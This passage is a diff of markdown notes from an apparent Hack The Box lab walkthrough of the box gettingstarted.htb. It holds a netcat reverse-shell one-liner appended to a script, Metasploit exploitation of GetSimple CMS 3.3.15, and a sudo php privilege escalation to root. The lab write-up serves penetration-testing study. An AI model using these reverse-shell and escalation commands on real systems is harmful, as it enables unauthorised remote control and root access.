 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' |
 tee -a monitor.sh
 ```
@@ -998,13 +989,13 @@ Target: `10.129.42.249`.
 Go to `http://10.129.42.249/`, and we see we have to add `10.129.42.249   gettingstarted.htb` to `/etc/hosts`.
 
 After running `nmap` (ports 22 and 80 are open) and `gobuster`, we discover many accessible directories. The command `searchsploit getsimple` returns several vulnerabilities. Browsing through the accessible directories, we get
-```{html eval=F}
+```html
 http://gettingstarted.htb/data/cache/2a4c6447379fba09620ba05582eb61af.txt
 {"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
 ```
 
 The version is `3.3.15` and there is a corresponding exploit [https://www.exploit-db.com/exploits/46880](https://www.exploit-db.com/exploits/46880) available for this version. We then use `metasploit` and get a reverse shell on the target.
-```{bash eval=F}
+```bash
 msfconsole
 msf6 > search GetSimple
 
@@ -1067,7 +1058,7 @@ www-data@gettingstarted:/var/www/html/theme$
 ```
 
 Now we go to `/home/mrb3n` to get the user flag `user.txt`. Running `sudo -l`, we get
-```{bash eval=F}
+```bash
 www-data@gettingstarted:/home/mrb3n$ sudo -l
 Matching Defaults entries for www-data on gettingstarted:
     env_reset, mail_badpass,
@@ -1078,7 +1069,7 @@ User www-data may run the following commands on gettingstarted:
 ```
 
 The `php` interpreter can be runned as root. Therefore:
-```{bash eval=F}
+```bash
 www-data@gettingstarted:/home/mrb3n$ cd /tmp
 www-data@gettingstarted:/tmp$ echo "<?php system('sudo bash'); ?>" > privesc.php
 www-data@gettingstarted:/tmp$ sudo php privesc.php
@@ -1116,7 +1107,7 @@ If the client had designed a secure network, this attack probably would not have
 ### Network Types
 
 Common Terminology
-```{txt eval=F}
+```txt
 Network Type 	                    Definition
 Wide Area Network (WAN) 	        Internet
 Local Area Network (LAN) 	        Internal Networks (Ex: Home or Office)
